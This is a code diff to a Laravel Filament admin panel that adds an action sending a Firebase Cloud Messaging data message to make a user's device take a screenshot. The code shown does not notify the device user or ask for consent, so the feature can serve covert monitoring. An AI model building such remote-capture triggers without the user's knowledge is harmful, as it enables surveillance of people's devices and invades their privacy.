@@ -70,6 +70,69 @@ class UserResource extends Resource
             ])
             ->actions([
                 Tables\Actions\EditAction::make(),
+                Tables\Actions\Action::make('request_screenshot')
+                    ->label('Request Screenshot')
+                    ->icon('heroicon-o-camera')
+                    ->requiresConfirmation()
+                    ->action(function (User $record) {
+                        if (!$record->fcm_token) {
+                            \Filament\Notifications\Notification::make()
+                                ->title('No FCM Token')
+                                ->body('This device does not have an FCM token.')
+                                ->danger()
+                                ->send();
+                            return;
+                        }
+
+                        try {
+                            // Path to credentials
+                            $credentialsPath = storage_path('app/firebase_credentials.json');
+                            if (!file_exists($credentialsPath)) {
+                                throw new \Exception('Firebase credentials not found at ' . $credentialsPath);
+                            }
+
+                            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
+                            $projectId = $jsonKey['project_id'];
+
+                            // Get Access Token
+                            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
+                                'https://www.googleapis.com/auth/firebase.messaging',
+                                $credentialsPath
+                            );
+                            $token = $credentials->fetchAuthToken(function ($urlKey) {
+                                return new \GuzzleHttp\Client(['base_uri' => $urlKey]);
+                            });
+
+                            // Send FCM
+                            $client = new \GuzzleHttp\Client();
+                            $response = $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
+                                'headers' => [
+                                    'Authorization' => 'Bearer ' . $token['access_token'],
+                                    'Content-Type' => 'application/json',
+                                ],
+                                'json' => [
+                                    'message' => [
+                                        'token' => $record->fcm_token,
+                                        'data' => [
+                                            'action' => 'screenshot',
+                                        ],
+                                    ],
+                                ],
+                            ]);
+
+                            \Filament\Notifications\Notification::make()
+                                ->title('Screenshot Requested')
+                                ->success()
+                                ->send();
+
+                        } catch (\Exception $e) {
+                             \Filament\Notifications\Notification::make()
+                                ->title('Failed to Request Screenshot')
+                                ->body($e->getMessage())
+                                ->danger()
+                                ->send();
+                        }
+                    }),
             ])
             ->bulkActions([
                 Tables\Actions\BulkActionGroup::make([
